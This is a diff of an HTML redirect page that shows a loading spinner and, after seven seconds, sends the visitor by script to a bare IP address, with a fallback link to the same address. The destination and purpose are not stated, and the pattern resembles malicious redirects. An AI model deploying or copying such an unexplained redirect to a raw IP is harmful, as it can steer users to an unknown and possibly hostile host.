@@ -1,64 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f6f8;
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      color: #333;
+    }
 
-        h1 {
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #007bff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
 
-        p {
-            font-size: 16px;
-            margin-top: 5px;
-        }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
-        a {
-            color: #0066cc;
-            text-decoration: none;
-            font-weight: bold;
-        }
+    .message {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
 
-        a:hover {
-            text-decoration: underline;
-        }
+    .fallback {
+      font-size: 14px;
+      margin-top: 10px;
+      color: #007bff;
+    }
 
-        .countdown {
-            font-weight: bold;
-            color: #ff6600;
-        }
-    </style>
+    .fallback a {
+      text-decoration: none;
+      color: inherit;
+      font-weight: bold;
+    }
+
+    .fallback a:hover {
+      text-decoration: underline;
+    }
+  </style>
 </head>
 <body>
-    <h1>Loading... <span class="countdown">7</span> seconds remaining</h1>
-    <p>If you are not redirected, <a href="https://43.204.221.9">click here</a>.</p>
+  <div class="loader"></div>
+  <div class="message">Please wait...</div>
+  <div class="fallback">Tap <a href="https://43.204.221.9">here</a> if it’s taking too long.</div>
 
-    <script>
-        let seconds = 7;
-        const countdownEl = document.querySelector('.countdown');
-
-        const countdown = setInterval(() => {
-            seconds--;
-            countdownEl.textContent = seconds;
-            if (seconds <= 0) {
-                clearInterval(countdown);
-                window.location.href = "https://43.204.221.9";
-            }
-        }, 1000);
-    </script>
+  <script>
+    window.onload = function() {
+      setTimeout(function() {
+        window.location.href = "https://43.204.221.9";
+      }, 7000);
+    };
+  </script>
 </body>
 </html>
